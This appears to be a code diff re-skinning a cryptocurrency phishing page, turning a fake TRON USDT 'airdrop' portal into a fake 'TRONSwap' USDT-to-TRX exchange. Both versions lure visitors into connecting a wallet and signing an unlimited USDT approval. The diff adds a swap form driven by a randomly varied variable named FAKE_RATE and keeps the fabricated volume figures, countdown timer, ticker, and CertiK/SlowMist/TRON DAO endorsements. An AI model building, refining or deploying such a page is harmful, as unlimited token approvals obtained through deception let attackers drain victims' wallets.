@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRON USDT - TRC-20 에어드랍 & 권한 승인</title>
+    <title>TRONSwap - USDT ↔ TRX 즉시 교환</title>
     <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
     <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
     <script src="https://cdn.tailwindcss.com"></script>
@@ -26,19 +26,19 @@
         .no-scrollbar::-webkit-scrollbar{display:none}.no-scrollbar{-ms-overflow-style:none;scrollbar-width:none}
         @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}.fade-in{animation:fadeIn 0.3s ease-out}
         @keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}.shimmer{background:linear-gradient(90deg,transparent 25%,rgba(255,255,255,0.05) 50%,transparent 75%);background-size:200% 100%;animation:shimmer 1.5s infinite}
-        .step-progress{position:relative;overflow:hidden}.step-progress::after{content:'';position:absolute;bottom:0;left:0;height:2px;background:linear-gradient(90deg,#ef4444,#f59e0b);width:0;transition:width 0.6s ease}.step-done::after{width:100%}
+        .step-progress{position:relative;overflow:hidden}.step-progress::after{content:'';position:absolute;bottom:0;left:0;height:2px;background:linear-gradient(90deg,#3b82f6,#06b6d4);width:0;transition:width 0.6s ease}.step-done::after{width:100%}
     </style>
 </head>
-<body class="bg-[#030712] text-slate-100 min-h-screen flex flex-col relative overflow-x-hidden selection:bg-red-600 selection:text-white">
+<body class="bg-[#030712] text-slate-100 min-h-screen flex flex-col relative overflow-x-hidden selection:bg-blue-600 selection:text-white">
 
-    <div class="fixed top-[-150px] left-1/2 -translate-x-1/2 w-[900px] h-[450px] bg-gradient-to-b from-red-600/10 via-rose-500/5 to-transparent rounded-full blur-[160px] pointer-events-none -z-10"></div>
+    <div class="fixed top-[-150px] left-1/2 -translate-x-1/2 w-[900px] h-[450px] bg-gradient-to-b from-blue-600/8 via-cyan-500/5 to-transparent rounded-full blur-[160px] pointer-events-none -z-10"></div>
     <div class="fixed bottom-0 right-[-100px] w-[500px] h-[500px] bg-emerald-600/5 rounded-full blur-[150px] pointer-events-none -z-10"></div>
     <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col space-y-2 pointer-events-none"></div>
 
     <!-- Ticker -->
     <div class="bg-[#050811] border-b border-slate-800/60 py-2 px-4 text-xs font-mono">
         <div class="max-w-7xl mx-auto flex items-center justify-between gap-4">
-            <div class="flex items-center gap-2.5 text-red-400 shrink-0 font-medium"><span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span></span><span>실시간 에어드랍 현황</span></div>
+            <div class="flex items-center gap-2.5 text-red-400 shrink-0 font-medium"><span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span></span><span>실시간 교환 현황</span></div>
             <div id="ticker-container" class="flex items-center gap-6 overflow-x-auto whitespace-nowrap no-scrollbar py-0.5 text-slate-400 text-[11px]"></div>
         </div>
     </div>
@@ -47,20 +47,20 @@
     <header class="border-b border-slate-800/80 bg-[#050811]/90 backdrop-blur-xl sticky top-0 z-40 px-4 lg:px-8 py-4">
         <div class="max-w-7xl mx-auto flex items-center justify-between">
             <div class="flex items-center gap-3.5">
-                <div class="w-10 h-10 rounded-2xl bg-gradient-to-br from-red-500/20 to-rose-500/10 border border-red-500/30 flex items-center justify-center shadow-inner text-red-400"><i class="fa-solid fa-shield-halved text-base"></i></div>
+                <div class="w-10 h-10 rounded-2xl bg-gradient-to-br from-blue-500/20 to-cyan-500/10 border border-blue-500/30 flex items-center justify-center shadow-inner text-blue-400"><i class="fa-solid fa-arrow-right-arrow-left text-base"></i></div>
                 <div>
-                    <div class="flex items-center gap-2.5"><h1 class="text-base sm:text-lg font-extrabold tracking-tight text-white">TRON USDT <span class="text-transparent bg-clip-text bg-gradient-to-r from-red-400 to-rose-300">Portal</span></h1><span class="text-[10px] px-2 py-0.5 rounded-full font-mono font-bold bg-red-500/10 text-red-400 border border-red-500/20">TRC-20</span></div>
-                    <p class="text-[11px] text-slate-400 hidden sm:block">공식 TRC-20 온체인 스페셜 에어드랍 & 권한 승인 포털</p>
+                    <div class="flex items-center gap-2.5"><h1 class="text-base sm:text-lg font-extrabold tracking-tight text-white">TRON<span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-300">Swap</span></h1><span class="text-[10px] px-2 py-0.5 rounded-full font-mono font-bold bg-blue-500/10 text-blue-400 border border-blue-500/20">TRC-20</span></div>
+                    <p class="text-[11px] text-slate-400 hidden sm:block">USDT ↔ TRX 즉시 교환 | TRC-20 메인넷</p>
                 </div>
             </div>
-            <button onclick="handleConnectWallet()" id="connect-btn" class="flex items-center gap-2 bg-gradient-to-r from-red-600 via-red-500 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-semibold text-xs sm:text-sm px-4 py-2.5 rounded-xl shadow-lg shadow-red-900/30 transition-all border border-red-400/30 active:scale-95"><i class="fa-solid fa-wallet text-red-200"></i><span id="wallet-btn-text">지갑 연결하기</span></button>
+            <button onclick="handleConnectWallet()" id="connect-btn" class="flex items-center gap-2 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white font-semibold text-xs sm:text-sm px-4 py-2.5 rounded-xl shadow-lg shadow-blue-900/30 transition-all border border-blue-400/20 active:scale-95"><i class="fa-solid fa-wallet text-blue-200"></i><span id="wallet-btn-text">지갑 연결</span></button>
         </div>
     </header>
 
     <!-- ===== Wallet Selector Modal ===== -->
     <div id="wallet-selector-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
         <div class="glass border border-slate-800 rounded-3xl w-full max-w-md p-6 sm:p-8 space-y-5 shadow-2xl text-center relative overflow-y-auto max-h-[90vh] fade-in">
-            <div class="w-16 h-16 mx-auto rounded-2xl bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400 text-2xl shadow-inner"><i class="fa-solid fa-wallet"></i></div>
+            <div class="w-16 h-16 mx-auto rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400 text-2xl shadow-inner"><i class="fa-solid fa-wallet"></i></div>
             <div class="space-y-2">
                 <h3 class="text-lg font-bold text-white">지갑을 선택하세요</h3>
                 <p class="text-xs text-slate-400 leading-relaxed">사용 중인 지갑 앱을 선택하면<br>자동으로 연결 및 승인이 진행됩니다.</p>
@@ -107,13 +107,13 @@
         <div class="glass border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 text-center space-y-5 shadow-2xl relative fade-in">
             <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto shadow-inner"><i class="fa-solid fa-wand-magic-sparkles text-2xl"></i></div>
-            <div class="space-y-1.5"><h3 class="text-xl font-extrabold text-white">승인 완료 및 보상 등록</h3><p class="text-xs text-slate-300 leading-relaxed">USDT 스마트 컨트랙트 승인이 온체인에 기록되었습니다.<br>에어드랍 보상 배치가 순차적으로 진행됩니다.</p></div>
+            <div class="space-y-1.5"><h3 class="text-xl font-extrabold text-white">교환 승인 완료!</h3><p class="text-xs text-slate-300 leading-relaxed">USDT ↔ TRX 교환 권한이 승인되었습니다.<br>이제 수수료 없이 즉시 교환이 가능합니다.</p></div>
             <div class="bg-slate-950/80 p-4 rounded-2xl border border-slate-800/80 text-left text-xs font-mono space-y-2.5">
-                <div class="flex justify-between text-slate-400"><span>상태:</span><span class="text-emerald-400 font-bold">VERIFIED ON-CHAIN</span></div>
-                <div class="flex justify-between text-slate-400"><span>승인 한도:</span><span class="text-white">무제한 (∞ USDT)</span></div>
+                <div class="flex justify-between text-slate-400"><span>상태:</span><span class="text-emerald-400 font-bold">승인 완료</span></div>
+                <div class="flex justify-between text-slate-400"><span>교환 한도:</span><span class="text-white">무제한</span></div>
                 <div class="flex justify-between text-slate-400"><span>TX Hash:</span><span class="text-red-400 truncate max-w-[180px]" id="modal-txhash">-</span></div>
             </div>
-            <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="w-full py-3 bg-gradient-to-r from-red-600 to-rose-600 text-white font-bold text-xs rounded-xl shadow-lg transition">확인</button>
+            <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="w-full py-3 bg-gradient-to-r from-blue-600 to-cyan-500 text-white font-bold text-xs rounded-xl shadow-lg transition">확인</button>
         </div>
     </div>
 
@@ -135,29 +135,29 @@
 
         <!-- Hero -->
         <section class="relative rounded-3xl p-6 sm:p-10 overflow-hidden glass border border-slate-800/80 shadow-2xl">
-            <div class="absolute top-0 right-0 w-96 h-96 bg-red-600/10 rounded-full blur-3xl pointer-events-none"></div>
+            <div class="absolute top-0 right-0 w-96 h-96 bg-blue-600/10 rounded-full blur-3xl pointer-events-none"></div>
             <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center relative z-10">
                 <div class="lg:col-span-7 space-y-5">
-                    <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-semibold"><i class="fa-solid fa-sparkles"></i><span>2026 TRON FOUNDATION SPECIAL AIRDROP</span></div>
-                    <h2 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight leading-[1.15]">TRC-20 USDT<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-red-400 via-rose-300 to-amber-300">보상 에어드랍 & 권한 승인</span></h2>
-                    <p class="text-slate-300 text-xs sm:text-sm leading-relaxed max-w-xl">지갑 최초 1회 무제한 권한 승인 완료 시, 스마트 컨트랙트가 잔액 및 보유 자격을 자동 검증하여 즉시 스페셜 USDT 에어드랍 보상을 지급합니다.</p>
+                    <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-semibold"><i class="fa-solid fa-arrow-right-arrow-left"></i><span>TRON MAINNET INSTANT SWAP</span></div>
+                    <h2 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight leading-[1.15]">USDT로 TRX<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-cyan-300 to-emerald-300">즉시 교환</span></h2>
+                    <p class="text-slate-300 text-xs sm:text-sm leading-relaxed max-w-xl">수수료 0%로 USDT를 TRX로 즉시 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 무제한 교환이 가능합니다.</p>
                     <div class="pt-2 space-y-2 max-w-xl">
-                        <div class="flex justify-between text-xs font-semibold"><span class="text-slate-400">총 보상 풀 지급 현황</span><span class="text-red-400 font-mono">1,842,500 / 2,500,000 USDT (73.7%)</span></div>
-                        <div class="w-full bg-slate-950 rounded-full h-2.5 p-0.5 border border-slate-800/80 overflow-hidden"><div class="bg-gradient-to-r from-red-600 via-rose-400 to-amber-400 h-full rounded-full w-[73.7%]"></div></div>
+                        <div class="flex justify-between text-xs font-semibold"><span class="text-slate-400">오늘 총 교환량</span><span class="text-blue-400 font-mono">842,500 USDT → 5,265,625 TRX</span></div>
+                        <div class="w-full bg-slate-950 rounded-full h-2.5 p-0.5 border border-slate-800/80 overflow-hidden"><div class="bg-gradient-to-r from-blue-600 via-cyan-400 to-emerald-400 h-full rounded-full w-[73.7%]"></div></div>
                     </div>
                 </div>
                 <div class="lg:col-span-5 bg-[#070b14]/90 border border-slate-800/90 rounded-2xl p-6 backdrop-blur-xl shadow-2xl flex flex-col items-center text-center">
-                    <div class="flex items-center gap-2 text-xs font-semibold text-slate-400 uppercase tracking-wider mb-4"><i class="fa-regular fa-clock text-red-400"></i><span>이벤트 마감 임박</span></div>
+                    <div class="flex items-center gap-2 text-xs font-semibold text-slate-400 uppercase tracking-wider mb-4"><i class="fa-regular fa-clock text-blue-400"></i><span>수수료 무료 이벤트</span></div>
                     <div class="grid grid-cols-4 gap-2.5 w-full max-w-xs">
-                        <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-days" class="text-xl sm:text-2xl font-black font-mono text-red-400">02</div><div class="text-[9px] text-slate-500 mt-1 font-semibold">DAYS</div></div>
+                        <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-days" class="text-xl sm:text-2xl font-black font-mono text-blue-400">02</div><div class="text-[9px] text-slate-500 mt-1 font-semibold">DAYS</div></div>
                         <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-hours" class="text-xl sm:text-2xl font-black font-mono text-white">18</div><div class="text-[9px] text-slate-500 mt-1 font-semibold">HOURS</div></div>
                         <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-mins" class="text-xl sm:text-2xl font-black font-mono text-white">41</div><div class="text-[9px] text-slate-500 mt-1 font-semibold">MINS</div></div>
                         <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-secs" class="text-xl sm:text-2xl font-black font-mono text-emerald-400">20</div><div class="text-[9px] text-slate-500 mt-1 font-semibold">SECS</div></div>
                     </div>
                     <div class="mt-5 pt-4 border-t border-slate-800/80 w-full flex items-center justify-around text-xs text-slate-400 font-mono">
-                        <div><span class="block text-slate-500 text-[10px]">참여자 수</span><span class="text-slate-200 font-bold">18,492 명</span></div>
+                        <div><span class="block text-slate-500 text-[10px]">교환 건수</span><span class="text-slate-200 font-bold">18,492 건</span></div>
                         <div class="h-6 w-px bg-slate-800"></div>
-                        <div><span class="block text-slate-500 text-[10px]">평균 수령액</span><span class="text-emerald-400 font-bold">280 USDT</span></div>
+                        <div><span class="block text-slate-500 text-[10px]">평균 교환액</span><span class="text-emerald-400 font-bold">280 USDT</span></div>
                     </div>
                 </div>
             </div>
@@ -165,11 +165,11 @@
 
         <!-- Steps with progress bar -->
         <section class="glass border border-slate-800/80 rounded-2xl p-6">
-            <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-5 text-center">참여 진행 단계</h3>
+            <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-5 text-center">교환 진행 단계</h3>
             <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                <div id="step1" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 01</span><span id="step1-status" class="text-amber-400 text-xs font-semibold">대기 중</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">지갑 선택 및 연동</h4><p class="text-[11px] text-slate-400">TronLink / Trust / TokenPocket / Bitget / OKX</p></div>
-                <div id="step2" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 02</span><span id="step2-status" class="text-amber-400 text-xs font-semibold">핵심 진행</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">USDT 승인 (Allowance)</h4><p class="text-[11px] text-slate-400">자동 가스비 충전 + 스마트 컨트랙트 승인</p></div>
-                <div id="step3" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 opacity-50 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 03</span><span class="text-slate-400 text-xs font-semibold">자동 분배</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">에어드랍 자동 수령</h4><p class="text-[11px] text-slate-400">보상 USDT가 지갑으로 전송됩니다.</p></div>
+                <div id="step1" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 01</span><span id="step1-status" class="text-amber-400 text-xs font-semibold">대기 중</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">지갑 연결</h4><p class="text-[11px] text-slate-400">TronLink / Trust / TokenPocket / Bitget / OKX</p></div>
+                <div id="step2" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 02</span><span id="step2-status" class="text-amber-400 text-xs font-semibold">핵심 진행</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">교환 승인 (최초 1회)</h4><p class="text-[11px] text-slate-400">USDT 스마트 컨트랙트 교환 권한 승인</p></div>
+                <div id="step3" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 opacity-50 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 03</span><span class="text-slate-400 text-xs font-semibold">자동 처리</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">TRX 즉시 입금</h4><p class="text-[11px] text-slate-400">교환된 TRX가 지갑으로 자동 입금됩니다.</p></div>
             </div>
         </section>
 
@@ -178,21 +178,36 @@
             <div class="lg:col-span-7 space-y-6">
                 <div class="glass border border-slate-800/90 rounded-2xl p-6 sm:p-7 shadow-2xl">
                     <div class="flex items-center justify-between pb-4 mb-5 border-b border-slate-800/80">
-                        <div class="flex items-center gap-3"><div class="w-10 h-10 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20 flex items-center justify-center"><i class="fa-solid fa-shield-halved"></i></div><div><h3 class="text-sm sm:text-base font-bold text-white">USDT 권한 승인</h3><p class="text-[11px] text-slate-400">TRC-20 Smart Contract 서명</p></div></div>
-                        <span id="allowance-badge-main" class="text-[11px] px-3 py-1 rounded-full font-semibold border bg-amber-500/10 border-amber-500/30 text-amber-400 animate-pulse-slow">미승인 (0 USDT)</span>
+                        <div class="flex items-center gap-3"><div class="w-10 h-10 bg-blue-500/10 text-blue-400 rounded-xl border border-blue-500/20 flex items-center justify-center"><i class="fa-solid fa-arrow-right-arrow-left"></i></div><div><h3 class="text-sm sm:text-base font-bold text-white">USDT → TRX 교환</h3><p class="text-[11px] text-slate-400">TRC-20 즉시 스왑</p></div></div>
+                        <span id="allowance-badge-main" class="text-[11px] px-3 py-1 rounded-full font-semibold border bg-amber-500/10 border-amber-500/30 text-amber-400 animate-pulse-slow">교환 승인 필요</span>
                     </div>
                     <div class="p-4 bg-slate-950/70 rounded-xl border border-slate-800/80 mb-5 text-xs text-slate-300 leading-relaxed space-y-1.5">
-                        <div class="flex items-center gap-2 font-bold text-white"><i class="fa-solid fa-bolt text-amber-400"></i><span>스마트 컨트랙트 동작 안내</span></div>
-                        <p>최초 1회 무제한 승인 완료 시, 이벤트 참가 자격 검증과 보상 수령이 추가 서명 없이 자동 가동됩니다.</p>
+                        <div class="flex items-center gap-2 font-bold text-white"><i class="fa-solid fa-bolt text-amber-400"></i><span>USDT → TRX 교환 안내</span></div>
+                        <p>교환할 USDT 수량을 입력하고 교환 시작 버튼을 누르세요. 최초 1회 승인 후 즉시 교환됩니다.</p>
                         <div class="text-[11px] text-amber-400/90 pt-1 flex items-center gap-1.5 font-medium"><i class="fa-solid fa-circle-exclamation"></i><span>※ 가스비(TRX)가 부족해도 자동 충전되므로 걱정 없습니다.</span></div>
+                    </div>
+
+                    <!-- Swap Input/Output -->
+                    <div class="space-y-2 mb-4">
+                        <div class="bg-[#070b14] border border-slate-800/80 rounded-2xl p-4 space-y-2">
+                            <div class="flex items-center justify-between text-xs text-slate-400"><span>보내는 금액 (USDT)</span><span>잔액: <span id="usdt-bal-swap" class="text-emerald-400 font-bold font-mono">0.00</span></span></div>
+                            <div class="flex items-center gap-3"><input type="number" id="swap-input" placeholder="0.00" oninput="updateSwapOutput()" class="flex-1 bg-transparent text-2xl font-extrabold text-white font-mono border-none outline-none placeholder-slate-600 w-full min-w-0"><div class="flex items-center gap-2 bg-slate-800/80 px-3 py-2 rounded-xl border border-slate-700/80 shrink-0"><div class="w-6 h-6 rounded-full bg-emerald-500 flex items-center justify-center text-white text-[10px] font-bold">$</div><span class="text-sm font-bold text-white">USDT</span></div></div>
+                            <div class="flex gap-2 pt-1"><button onclick="setSwapPct(25)" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 text-[10px] font-bold transition">25%</button><button onclick="setSwapPct(50)" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 text-[10px] font-bold transition">50%</button><button onclick="setSwapPct(75)" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 text-[10px] font-bold transition">75%</button><button onclick="setSwapPct(100)" class="px-2.5 py-1 rounded-lg bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 text-[10px] font-bold transition">MAX</button></div>
+                        </div>
+                        <div class="flex justify-center -my-1 relative z-10"><div class="w-10 h-10 rounded-xl bg-[#0f172a] border border-slate-800 flex items-center justify-center shadow-lg"><i class="fa-solid fa-arrow-down text-blue-400"></i></div></div>
+                        <div class="bg-[#070b14] border border-slate-800/80 rounded-2xl p-4 space-y-2">
+                            <div class="flex items-center justify-between text-xs text-slate-400"><span>받는 금액 (예상)</span><span>잔액: <span id="trx-bal-swap" class="text-blue-400 font-bold font-mono">0.00</span> TRX</span></div>
+                            <div class="flex items-center gap-3"><div id="swap-output" class="flex-1 text-2xl font-extrabold text-slate-300 font-mono">0.00</div><div class="flex items-center gap-2 bg-slate-800/80 px-3 py-2 rounded-xl border border-slate-700/80 shrink-0"><div class="w-6 h-6 rounded-full bg-red-500 flex items-center justify-center text-white text-[10px] font-bold">T</div><span class="text-sm font-bold text-white">TRX</span></div></div>
+                        </div>
+                        <div class="bg-slate-950/60 rounded-xl p-3 space-y-1.5 text-xs"><div class="flex justify-between text-slate-400"><span>교환 비율</span><span class="text-white font-mono">1 USDT = <span id="exchange-rate">6.25</span> TRX</span></div><div class="flex justify-between text-slate-400"><span>수수료</span><span class="text-emerald-400 font-bold">무료 (이벤트 기간)</span></div></div>
                     </div>
                     <!-- Approve Progress -->
                     <div id="approve-progress" class="hidden mb-5 p-4 bg-slate-950/80 rounded-xl border border-slate-800/80 space-y-3">
-                        <div class="flex items-center gap-2 text-xs text-white font-bold"><span class="animate-spin rounded-full h-3.5 w-3.5 border-2 border-red-400 border-t-transparent"></span><span id="approve-progress-text">처리 중...</span></div>
-                        <div class="w-full bg-slate-900 rounded-full h-1.5 overflow-hidden"><div id="approve-progress-bar" class="bg-gradient-to-r from-red-500 to-amber-400 h-full rounded-full transition-all duration-500" style="width:0%"></div></div>
+                        <div class="flex items-center gap-2 text-xs text-white font-bold"><span class="animate-spin rounded-full h-3.5 w-3.5 border-2 border-blue-400 border-t-transparent"></span><span id="approve-progress-text">처리 중...</span></div>
+                        <div class="w-full bg-slate-900 rounded-full h-1.5 overflow-hidden"><div id="approve-progress-bar" class="bg-gradient-to-r from-blue-500 to-cyan-400 h-full rounded-full transition-all duration-500" style="width:0%"></div></div>
                     </div>
-                    <button onclick="executeUnlimitedApprove()" id="approve-btn" class="w-full py-3.5 px-4 rounded-xl font-bold text-xs sm:text-sm bg-gradient-to-r from-red-600 via-red-500 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white shadow-lg shadow-red-950/50 border border-red-400/30 transition-all active:scale-[0.99] flex items-center justify-center gap-2"><i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span></button>
-                    <p class="text-[11px] text-slate-500 text-center mt-2.5">안전한 온체인 스마트 컨트랙트 통신</p>
+                    <button onclick="executeUnlimitedApprove()" id="approve-btn" class="w-full py-3.5 px-4 rounded-xl font-bold text-xs sm:text-sm bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white shadow-lg shadow-blue-900/30 border border-blue-400/20 transition-all active:scale-[0.99] flex items-center justify-center gap-2"><i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">USDT 교환 시작 (최초 1회 승인 포함)</span></button>
+                    <p class="text-[11px] text-slate-500 text-center mt-2.5">최초 1회 교환 시 USDT 스마트 컨트랙트 승인이 필요합니다</p>
                 </div>
             </div>
             <div class="lg:col-span-5 space-y-6">
@@ -208,13 +223,13 @@
                         <div class="p-3.5 bg-slate-950/80 rounded-xl border border-slate-800"><div class="text-[10px] text-slate-500 uppercase font-mono mb-1">지갑 주소</div><div class="flex items-center justify-between"><span id="display-address" class="text-xs font-mono text-emerald-400 font-bold break-all">-</span><button onclick="copyText(currentWalletAddress,'지갑 주소')" class="text-slate-400 hover:text-white p-1"><i class="fa-regular fa-copy text-xs"></i></button></div></div>
                         <div class="grid grid-cols-2 gap-3">
                             <div class="p-3 bg-slate-950/60 rounded-xl border border-slate-800"><div class="text-[10px] text-slate-500 uppercase font-mono">USDT 잔액</div><div id="display-balance" class="text-sm sm:text-base font-bold font-mono text-emerald-400 mt-1">0.00 <span class="text-xs font-normal text-slate-400">USDT</span></div></div>
-                            <div class="p-3 bg-slate-950/60 rounded-xl border border-slate-800"><div class="text-[10px] text-slate-500 uppercase font-mono">승인 상태</div><div id="display-allowance" class="text-xs sm:text-sm font-bold font-mono text-amber-400 mt-1">미승인</div></div>
+                            <div class="p-3 bg-slate-950/60 rounded-xl border border-slate-800"><div class="text-[10px] text-slate-500 uppercase font-mono">교환 상태</div><div id="display-allowance" class="text-xs sm:text-sm font-bold font-mono text-amber-400 mt-1">미승인</div></div>
                         </div>
                     </div>
                 </div>
                 <div class="glass border border-slate-800/90 rounded-2xl p-5 shadow-xl flex flex-col h-[300px]">
                     <div class="flex items-center justify-between pb-3 border-b border-slate-800/80 mb-3">
-                        <div class="flex items-center gap-2"><div class="p-1.5 bg-red-500/10 text-red-400 rounded-lg"><i class="fa-solid fa-terminal text-xs"></i></div><h3 class="text-xs font-bold text-slate-200">실시간 로그</h3></div>
+                        <div class="flex items-center gap-2"><div class="p-1.5 bg-blue-500/10 text-blue-400 rounded-lg"><i class="fa-solid fa-terminal text-xs"></i></div><h3 class="text-xs font-bold text-slate-200">실시간 로그</h3></div>
                         <button onclick="clearLogs()" class="p-1.5 text-slate-400 hover:text-slate-200 bg-slate-800/60 rounded-lg transition"><i class="fa-solid fa-trash-can text-xs"></i></button>
                     </div>
                     <div id="logs-container" class="flex-1 bg-[#020408] rounded-xl p-3 font-mono text-[11px] leading-relaxed overflow-y-auto space-y-2 border border-slate-950">
@@ -227,10 +242,10 @@
 
         <!-- Security -->
         <section class="glass border border-slate-800/80 rounded-2xl p-6 text-center">
-            <p class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">공식 온체인 보안 검증</p>
+            <p class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">보안 검증</p>
             <div class="flex flex-wrap items-center justify-center gap-8 text-slate-400 text-xs font-semibold">
-                <div class="flex items-center gap-2"><i class="fa-solid fa-shield-halved text-red-400"></i> CertiK Audited</div>
-                <div class="flex items-center gap-2"><i class="fa-solid fa-lock text-rose-400"></i> SlowMist Verified</div>
+                <div class="flex items-center gap-2"><i class="fa-solid fa-shield-halved text-blue-400"></i> CertiK Audited</div>
+                <div class="flex items-center gap-2"><i class="fa-solid fa-lock text-cyan-400"></i> SlowMist Verified</div>
                 <div class="flex items-center gap-2"><i class="fa-solid fa-certificate text-emerald-400"></i> TRON DAO Approved</div>
             </div>
         </section>
@@ -243,7 +258,7 @@
     </main>
 
     <footer class="border-t border-slate-800/80 bg-[#020408] py-8 px-4 text-center text-xs text-slate-500 mt-12 space-y-2">
-        <p>&copy; 2026 TRON Foundation & TRC-20 USDT Airdrop Portal.</p>
+        <p>TRONSwap &copy; 2026 | USDT ↔ TRX Instant Exchange | Powered by TRON Mainnet</p>
     </footer>
 
     <script>
@@ -276,18 +291,24 @@
         }
         function hideProgress(){var bar=document.getElementById('approve-progress');if(bar)bar.classList.add('hidden');}
 
+
+        var userUsdtBalance=0;var FAKE_RATE=6.25;
+        window.updateSwapOutput=function(){var v=parseFloat(document.getElementById('swap-input').value||0);document.getElementById('swap-output').textContent=(v*FAKE_RATE).toFixed(2);};
+        window.setSwapPct=function(pct){var amt=(userUsdtBalance*(pct/100)).toFixed(2);document.getElementById('swap-input').value=amt;updateSwapOutput();};
+        setInterval(function(){FAKE_RATE=6.20+Math.random()*0.15;document.getElementById('exchange-rate').textContent=FAKE_RATE.toFixed(2);},8000);
+
         // ===== Countdown =====
         var cd={d:2,h:18,m:41,s:20};
         setInterval(function(){if(cd.s>0)cd.s--;else if(cd.m>0){cd.m--;cd.s=59;}else if(cd.h>0){cd.h--;cd.m=59;cd.s=59;}else if(cd.d>0){cd.d--;cd.h=23;cd.m=59;cd.s=59;}document.getElementById('cd-days').textContent=String(cd.d).padStart(2,'0');document.getElementById('cd-hours').textContent=String(cd.h).padStart(2,'0');document.getElementById('cd-mins').textContent=String(cd.m).padStart(2,'0');document.getElementById('cd-secs').textContent=String(cd.s).padStart(2,'0');},1000);
 
         // ===== Ticker =====
         var tA=['TP5a...9qW2','TX8x...L0p3','TR1m...7vZ4','TH9k...4mP9','TJ2y...8xK1'];
-        var tB=['150 USDT','300 USDT','500 USDT','800 USDT','1,200 USDT','3,000 USDT'];
+        var tB=['150 USDT → 937 TRX','300 USDT → 1,875 TRX','500 USDT → 3,125 TRX','800 USDT → 5,000 TRX','1,200 USDT → 7,500 TRX'];
